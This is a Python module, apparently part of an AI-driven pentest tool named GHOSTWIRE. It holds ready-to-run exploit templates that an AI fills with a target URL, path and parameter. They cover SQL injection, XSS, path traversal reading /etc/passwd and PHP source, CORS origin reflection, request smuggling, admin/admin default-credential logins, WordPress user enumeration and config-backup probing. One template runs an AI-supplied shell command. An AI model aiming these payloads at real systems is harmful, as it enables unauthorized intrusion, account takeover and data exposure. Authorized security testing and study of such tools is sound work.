"""
GHOSTWIRE PoC Template Engine
─────────────────────────────
Hardcoded exploit templates per vulnerability class.
AI only fills in target-specific parameters (URL, path, param name).
Each template has built-in FP guards and strict VULN_PROVEN / NOT_PROVEN output.
"""

# ─── Template: SQL Injection ────────────────────────────────────────────
SQLI_TEMPLATE = '''
import requests, sys, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
PATH   = "{path}"
PARAM  = "{param}"

url = f"{TARGET}{PATH}"
PROBES = [
    {PARAM: "' OR '1'='1' -- -"},
    {PARAM: "1' AND SLEEP(3) -- -"},
    {PARAM: "1 UNION SELECT NULL,version(),NULL -- -"},
    {PARAM: "1' AND 1=CONVERT(int,(SELECT @@version)) -- -"},
]

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
proven = False

for i, payload in enumerate(PROBES):
    try:
        r = requests.get(url, params=payload, headers=headers, timeout=15, verify=False, allow_redirects=False)
        body = r.text.lower()
        # Check for actual SQL error / data leak - NOT homepage HTML
        if any(x in body for x in ["sql syntax", "mysql", "mariadb", "postgresql",
                                     "sqlite", "ora-", "microsoft sql", "unclosed quotation",
                                     "you have an error", "warning: mysql"]):
            print(f"VULN_PROVEN: SQL error triggered with probe {i+1}: {r.text[:200]}")
            proven = True
            break
        if "<!doctype html" in body and "wp-content" in body:
            continue  # Got homepage back - not a real hit
    except Exception as e:
        print(f"NOT_PROVEN: Network/Execution Error - {e}")

if not proven:
    # Time-based blind check
    import time
    try:
        t1 = time.time()
        r = requests.get(url, params={PARAM: "1' AND SLEEP(5) -- -"}, headers=headers, timeout=20, verify=False, allow_redirects=False)
        elapsed = time.time() - t1
        if elapsed >= 4.5:
            print(f"VULN_PROVEN: Time-based blind SQLi confirmed ({elapsed:.1f}s delay)")
            proven = True
    except Exception as e:
        print(f"NOT_PROVEN: Network/Execution Error - {e}")

if not proven:
    print("NOT_PROVEN: No SQL injection indicators found in any probe response")
'''

# ─── Template: XSS ──────────────────────────────────────────────────────
XSS_TEMPLATE = '''
import requests, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
PATH   = "{path}"
PARAM  = "{param}"
CANARY = "gw5xss7probe"

url = f"{TARGET}{PATH}"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

PROBES = [
    {PARAM: f"<script>alert('{CANARY}')</script>"},
    {PARAM: f"'><img src=x onerror=alert('{CANARY}')>"},
    {PARAM: f"javascript:alert('{CANARY}')"},
    {PARAM: f"{{{CANARY}}}"},  # SSTI check: template engines render {{...}}
]
proven = False

for payload in PROBES:
    try:
        r = requests.get(url, params=payload, headers=headers, timeout=15, verify=False)
        if CANARY in r.text and "wp-content" not in r.text:
            reflected_ctx = r.text[max(0, r.text.index(CANARY)-50):r.text.index(CANARY)+60]
            print(f"VULN_PROVEN: XSS canary reflected in response: {reflected_ctx}")
            proven = True
            break
    except Exception as e:
        print(f"NOT_PROVEN: Network/Execution Error - {e}")

if not proven:
    print("NOT_PROVEN: XSS canary was not reflected in any probe response")
'''

# ─── Template: LFI / Path Traversal ──────────────────────────────────────────
LFI_TEMPLATE = '''
import requests, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
PATH   = "{path}"
PARAM  = "{param}"

url = f"{TARGET}{PATH}"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

PROBES = [
    {PARAM: "../../../../etc/passwd"},
    {PARAM: "....//....//....//etc/passwd"},
    {PARAM: "/etc/passwd"},
    {PARAM: "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini"},
    {PARAM: "php://filter/convert.base64-encode/resource=index"},
]
proven = False

for payload in PROBES:
    try:
        r = requests.get(url, params=payload, headers=headers, timeout=15, verify=False, allow_redirects=False)
        body = r.text
        if "root:x:0" in body or "root:*:0" in body:
            print(f"VULN_PROVEN: /etc/passwd leaked: {body[:200]}")
            proven = True
            break
        if "[fonts]" in body.lower() or "[extensions]" in body.lower():
            print(f"VULN_PROVEN: win.ini leaked: {body[:200]}")
            proven = True
            break
        if "PD9waHA" in body or "PGh0bWw" in body:  # base64 of <?php / <html
            print(f"VULN_PROVEN: PHP source via php://filter: {body[:200]}")
            proven = True
            break
        if "wp-content" in body.lower() and "<!doctype" in body.lower():
            continue  # homepage returned
    except Exception as e:
        print(f"NOT_PROVEN: Network/Execution Error - {e}")

if not proven:
    print("NOT_PROVEN: No path traversal indicators found")
'''

# ─── Template: CORS Misconfiguration ─────────────────────────────────────────
CORS_TEMPLATE = '''
import requests, urllib3
urllib3.disable_warnings()

import urllib.parse

TARGET = "{target}"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
proven = False

# Test 1: Reflect arbitrary origin
# Handle both bare domains (novalink.lk) and full URLs (https://novalink.lk)
if '://' in TARGET:
    parsed = urllib.parse.urlparse(TARGET)
    domain = parsed.netloc
else:
    domain = TARGET
evil_origins = ["https://evil.com", "https://attacker.io", f"https://{domain}.evil.com"]
for origin in evil_origins:
    try:
        r = requests.get(TARGET, headers={**headers, "Origin": origin}, timeout=10, verify=False)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        if acao == origin:
            msg = f"Origin '{origin}' reflected in ACAO"
            if acac.lower() == "true":
                msg += " WITH credentials=true (critical)"
            print(f"VULN_PROVEN: {msg}")
            proven = True
            break
        if acao == "*":
            print(f"VULN_PROVEN: Wildcard ACAO (*) allows any origin")
            proven = True
            break
    except Exception as e:
        print(f"NOT_PROVEN: Network/Execution Error - {e}")

if not proven:
    print("NOT_PROVEN: No CORS misconfiguration detected (origins not reflected)")
'''

# ─── Template: SSL/TLS Weakness ──────────────────────────────────────────────
SSL_TEMPLATE = '''
import ssl, socket
TARGET = "{target}"
HOST = TARGET.replace("https://","").replace("http://","").split("/")[0].split(":")[0]
PORT = 443
proven = False

# Test deprecated TLS versions (ssl.PROTOCOL_TLSv1/TLSv1_1 removed in Python 3.12)
# Use getattr guard for compatibility across Python versions.
legacy_protos = []
for attr, name in [("PROTOCOL_TLSv1", "TLSv1.0"), ("PROTOCOL_TLSv1_1", "TLSv1.1")]:
    proto_val = getattr(ssl, attr, None)
    if proto_val is not None:
        legacy_protos.append((name, proto_val))

for proto_name, proto_val in legacy_protos:
    try:
        ctx = ssl.SSLContext(proto_val)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((HOST, PORT), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=HOST) as ssock:
                ver = ssock.version()
                print(f"VULN_PROVEN: Server accepts deprecated {proto_name} (negotiated: {ver})")
                proven = True
                break
    except (ssl.SSLError, OSError, AttributeError):
        pass

# On Python 3.12+, try via minimum_version negotiation instead
if not proven and not legacy_protos:
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.minimum_version = ssl.TLSVersion.TLSv1
        with socket.create_connection((HOST, PORT), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=HOST) as ssock:
                ver = ssock.version()
                if ver in ("TLSv1", "TLSv1.1"):
                    print(f"VULN_PROVEN: Server accepts deprecated {ver}")
                    proven = True
    except Exception as e:
        print(f"NOT_PROVEN: Network/Execution Error - {e}")

if not proven:
    # Check cert validity
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((HOST, PORT), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=HOST) as ssock:
                cert = ssock.getpeercert()
                import datetime
                not_after = ssl.cert_time_to_seconds(cert["notAfter"])
                if not_after < datetime.datetime.now().timestamp():
                    print(f"VULN_PROVEN: SSL certificate expired (notAfter: {cert['notAfter']})")
                    proven = True
    except ssl.CertificateError as e:
        print(f"VULN_PROVEN: SSL certificate error: {e}")
        proven = True
    except Exception as e:
        print(f"NOT_PROVEN: Network/Execution Error - {e}")

if not proven:
    print("NOT_PROVEN: SSL/TLS configuration appears secure (no deprecated protocols accepted)")
'''

# ─── Template: HTTP Request Smuggling ────────────────────────────────────────
SMUGGLING_TEMPLATE = '''
import socket, ssl, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
HOST = TARGET.replace("https://","").replace("http://","").split("/")[0].split(":")[0]
PORT = 443 if TARGET.startswith("https") else 80
proven = False

# CL.TE Smuggling Probe
payload = (
    "POST / HTTP/1.1\\r\\n"
    f"Host: {{HOST}}\\r\\n"
    "Content-Length: 4\\r\\n"
    "Transfer-Encoding: chunked\\r\\n"
    "\\r\\n"
    "1\\r\\n"
    "Z\\r\\n"
    "Q"
)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    if PORT == 443:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=HOST)

    sock.connect((HOST, PORT))
    sock.sendall(payload.encode())

    # Send a follow-up request to see if it's poisoned
    follow_up = f"GET / HTTP/1.1\\r\\nHost: {HOST}\\r\\n\\r\\n"
    sock.sendall(follow_up.encode())

    response = sock.recv(4096).decode(errors='ignore')
    if "ZGET" in response:
        print(f"VULN_PROVEN: Request smuggling potential detected (poisoned response: {response[:100]})")
        proven = True
    sock.close()
except Exception as e:
    print(f"NOT_PROVEN: Network/Execution Error - {e}")

if not proven:
    print("NOT_PROVEN: No request smuggling indicators found (CL.TE probe)")
'''

# ─── Template: Credential Test ───────────────────────────────────────────────
CREDENTIAL_TEMPLATE = '''
import requests, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
USERNAME = "{username}"
PASSWORD = "{password}"
LOGIN_PATH = "{login_path}"

url = f"{TARGET}{LOGIN_PATH}"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
proven = False

# Try common login endpoints
login_data = [
    {"username": USERNAME, "password": PASSWORD},
    {"user": USERNAME, "pass": PASSWORD},
    {"log": USERNAME, "pwd": PASSWORD},  # WordPress
    {"email": USERNAME, "password": PASSWORD},
]

for data in login_data:
    try:
        r = requests.post(url, data=data, headers=headers, timeout=15, verify=False, allow_redirects=False)
        if r.status_code in [200, 302]:
            cookies = dict(r.cookies)
            if any(k in str(cookies).lower() for k in ["session", "token", "auth", "logged", "wordpress_logged_in"]):
                print(f"VULN_PROVEN: Login successful with {USERNAME}:{PASSWORD} - session cookie: {cookies}")
                proven = True
                break
        if "dashboard" in r.text.lower() or "welcome" in r.text.lower() or "logout" in r.text.lower():
            if "wp-content" not in r.text.lower():
                print(f"VULN_PROVEN: Login appears successful (dashboard/welcome page detected)")
                proven = True
                break
    except Exception as e:
        print(f"NOT_PROVEN: Network/Execution Error - {e}")

if not proven:
    print(f"NOT_PROVEN: Credential {USERNAME}:{PASSWORD} did not produce a valid session")
'''

# ─── Template: WordPress Enumeration PoC ─────────────────────────────────────
WORDPRESS_TEMPLATE = '''
import requests, json, re, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
findings = []

# 1. WP REST API user enumeration
try:
    r = requests.get(f"{TARGET}/wp-json/wp/v2/users", headers=headers, timeout=15, verify=False)
    if r.status_code == 200:
        try:
            users = r.json()
            if isinstance(users, list) and len(users) > 0:
                names = [u.get("slug", u.get("name", "?")) for u in users[:5]]
                findings.append(f"WP user enum via REST API: {', '.join(names)}")
        except Exception as e:
            print(f"NOT_PROVEN: Network/Execution Error - {e}")
except Exception as e:
    print(f"NOT_PROVEN: Network/Execution Error - {e}")

# 2. XMLRPC enabled
try:
    r = requests.post(f"{TARGET}/xmlrpc.php",
                       data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                       headers={**headers, "Content-Type": "text/xml"}, timeout=15, verify=False)
    if r.status_code == 200 and "methodResponse" in r.text:
        methods = re.findall(r"<string>(.*?)</string>", r.text)
        if methods:
            findings.append(f"XMLRPC enabled with {len(methods)} methods (brute force / pingback vector)")
except Exception as e:
    print(f"NOT_PROVEN: Network/Execution Error - {e}")

# 3. Debug/readme exposure
for path in ["/readme.html", "/wp-config.php.bak", "/wp-config.php~", "/.wp-config.php.swp",
             "/wp-content/debug.log", "/wp-admin/install.php"]:
    try:
        r = requests.get(f"{TARGET}{path}", headers=headers, timeout=10, verify=False)
        if r.status_code == 200 and len(r.text) > 100:
            if "wp-content" not in r.text.lower() or "debug.log" in path:
                if "wordpress" in r.text.lower() or "PHP" in r.text or "log" in path:
                    findings.append(f"Sensitive file accessible: {path} ({len(r.text)} bytes)")
    except Exception as e:
        print(f"NOT_PROVEN: Network/Execution Error - {e}")

if findings:
    print("VULN_PROVEN: " + " | ".join(findings))
else:
    print("NOT_PROVEN: WordPress hardened - no user enum, XMLRPC, or debug files exposed")
'''

# ─── Template: Information Disclosure (Server Headers, Error Pages, etc)
DISCLOSURE_TEMPLATE = '''
import requests, re, urllib3, socket
urllib3.disable_warnings()

TARGET = "{target}"
INFO_TYPES = ["server", "x-powered-by", "x-aspnet-version", "x-runtime", "x-version", "via", "x-generator", "x-frame-options"]

disclosed = []

# Check HTTP headers for information leakage
try:
    r = requests.head(TARGET, headers={"User-Agent": "Mozilla/5.0"}, timeout=10, verify=False, allow_redirects=False)
    for header_name in INFO_TYPES:
        if header_name in r.headers:
            header_val = r.headers.get(header_name, "").strip()
            if header_val:
                disclosed.append(f"{header_name}: {header_val}")

    # Also check GET response headers
    r = requests.get(TARGET, headers={"User-Agent": "Mozilla/5.0"}, timeout=10, verify=False)
    for header_name in INFO_TYPES:
        if header_name in r.headers and f"{header_name}:" not in " | ".join(disclosed):
            header_val = r.headers.get(header_name, "").strip()
            if header_val:
                disclosed.append(f"{header_name}: {header_val}")

    # Check error pages for tech stack leakage
    for path in ["/nonexistent", "/admin/fake", "/.env", "/config.php", "/.git/config"]:
        try:
            r = requests.get(TARGET + path, timeout=5, verify=False)
            # Check for version numbers, framework names, error patterns
            if any(x in r.text for x in ["php", "python", "ruby", "node", "version", "traceback", "stack trace", ".py"]):
                error_info = re.search(r"(PHP.*?[0-9.]+|Python [0-9.]+|Version [0-9.]+)", r.text)
                if error_info:
                    disclosed.append(f"Error page disclosure: {error_info.group(1)}")
        except Exception as e:
            print(f"NOT_PROVEN: Network/Execution Error - {e}")

except Exception as e:
    print(f"NOT_PROVEN: {str(e)}")
    exit()

if disclosed:
    print(f"VULN_PROVEN: Information disclosed - {' | '.join(disclosed[:3])}")
else:
    print("NOT_PROVEN: No information disclosure detected in headers or error pages")
'''

# ─── Template: Server Misconfiguration (CORS, Debug Mode, etc) ───────────────
MISCONFIGURATION_TEMPLATE = '''
import requests, re, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
issues = []

# Check for debug mode indicators
try:
    r = requests.get(TARGET, timeout=10, verify=False)
    if r.status_code == 200:
        # PHP debug mode indicators
        if "Warning:" in r.text or "Parse error:" in r.text or "Call stack:" in r.text:
            issues.append("PHP debug mode/error output enabled")
        # Django debug page
        if "TemplateDoesNotExist" in r.text or "django.conf.settings" in r.text:
            issues.append("Django debug mode enabled (templates exposed)")
        # Flask debug
        if "Traceback" in r.text and "site-packages" in r.text:
            issues.append("Flask debug mode enabled (stack traces exposed)")
        # ASP.NET errors
        if "Server Error in" in r.text and "Application ID" in r.text:
            issues.append("ASP.NET detailed error pages enabled")
except Exception as e:
    print(f"NOT_PROVEN: Network/Execution Error - {e}")

# Check for open endpoints
for endpoint in ["/api/", "/admin/", "/actuator", "/debug", "/.git", "/backup", "/upload"]:
    try:
        r = requests.get(TARGET + endpoint, timeout=5, verify=False, allow_redirects=False)
        if r.status_code == 200:
            issues.append(f"Misconfigured endpoint accessible: {endpoint} ({r.status_code})")
    except Exception as e:
        print(f"NOT_PROVEN: Network/Execution Error - {e}")

if issues:
    print(f"VULN_PROVEN: Misconfiguration detected - {' | '.join(issues[:3])}")
else:
    print("NOT_PROVEN: No obvious misconfigurations detected")
'''

# ─── Template: Generic AI Dynamic Exploit (Re-verify output) ─────────────────
AI_DYNAMIC_TEMPLATE = '''
import requests, subprocess, urllib3
urllib3.disable_warnings()

TARGET = "{target}"
VERIFICATION_CMD = "{verification_cmd}"

# If a command was identified, re-run it and look for the same indicators
try:
    if VERIFICATION_CMD:
        import shlex
        args = shlex.split(VERIFICATION_CMD)
        result = subprocess.run(args, capture_output=True, timeout=15, text=True)
        output = (result.stdout + result.stderr).strip()

        # Check if output contains non-generic, meaningful data
        if len(output) > 20 and "usage:" not in output.lower() and "command not found" not in output.lower():
            # Look for specific success indicators based on what we know failed in first attempt
            if any(x in output.lower() for x in ["vercel", "server:", "powered by", "header", "version", "error", "found", "exist"]):
                print(f"VULN_PROVEN: {output[:200]}")
            else:
                print(f"NOT_PROVEN: Command succeeded but output inconclusive")
        else:
            print(f"NOT_PROVEN: Command output too generic or empty")
except subprocess.TimeoutExpired:
    print("NOT_PROVEN: Command timeout")
except Exception as e:
    print(f"NOT_PROVEN: {str(e)}")
'''

# ─── Template registry ───────────────────────────────────────────────────────
# Maps vulnerability class keywords -> (template_string, default_params)
POC_TEMPLATES = {
    "sql": (SQLI_TEMPLATE, {"path": "/", "param": "id"}),
    "sqli": (SQLI_TEMPLATE, {"path": "/", "param": "id"}),
    "sql_injection": (SQLI_TEMPLATE, {"path": "/", "param": "id"}),
    "xss": (XSS_TEMPLATE, {"path": "/", "param": "q"}),
    "cross-site": (XSS_TEMPLATE, {"path": "/", "param": "q"}),
    "lfi": (LFI_TEMPLATE, {"path": "/", "param": "file"}),
    "rfi": (LFI_TEMPLATE, {"path": "/", "param": "file"}),
    "path_traversal": (LFI_TEMPLATE, {"path": "/", "param": "file"}),
    "directory_traversal": (LFI_TEMPLATE, {"path": "/", "param": "file"}),
    "cors": (CORS_TEMPLATE, {}),
    "cors_misconfig": (CORS_TEMPLATE, {}),
    "ssl": (SSL_TEMPLATE, {}),
    "ssl_weakness": (SSL_TEMPLATE, {}),
    "tls": (SSL_TEMPLATE, {}),
    "credential": (CREDENTIAL_TEMPLATE, {"username": "admin", "password": "admin", "login_path": "/wp-login.php"}),
    "valid_credential": (CREDENTIAL_TEMPLATE, {"username": "admin", "password": "admin", "login_path": "/wp-login.php"}),
    "wordpress": (WORDPRESS_TEMPLATE, {}),
    "disclosure": (DISCLOSURE_TEMPLATE, {}),
    "information_disclosure": (DISCLOSURE_TEMPLATE, {}),
    "server_info": (DISCLOSURE_TEMPLATE, {}),
    "header_disclosure": (DISCLOSURE_TEMPLATE, {}),
    "version_disclosure": (DISCLOSURE_TEMPLATE, {}),
    "misconfiguration": (MISCONFIGURATION_TEMPLATE, {}),
    "server_misconfiguration": (MISCONFIGURATION_TEMPLATE, {}),
    "debug_mode": (MISCONFIGURATION_TEMPLATE, {}),
    "open_endpoint": (MISCONFIGURATION_TEMPLATE, {}),
    "smuggling": (SMUGGLING_TEMPLATE, {}),
    "request_smuggling": (SMUGGLING_TEMPLATE, {}),
    "ai_dynamic_exploit": (AI_DYNAMIC_TEMPLATE, {"verification_cmd": "curl -I {target}"}),
}


def get_poc_template(
        vuln_type: str, vuln_detail: str = "") -> tuple[str | None, dict]:
    """
    Look up the best PoC template for a vulnerability type.
    Returns (template_string, default_params) or (None, {}) if no match.
    """
    typ_lower = vuln_type.lower()
    detail_lower = vuln_detail.lower()

    # Direct match on type
    for key, (template, defaults) in POC_TEMPLATES.items():
        if key in typ_lower:
            return template, defaults.copy()

    # Match on detail content (e.g. nuclei finding with "wordpress" in name)
    for key, (template, defaults) in POC_TEMPLATES.items():
        if key in detail_lower:
            return template, defaults.copy()

    return None, {}
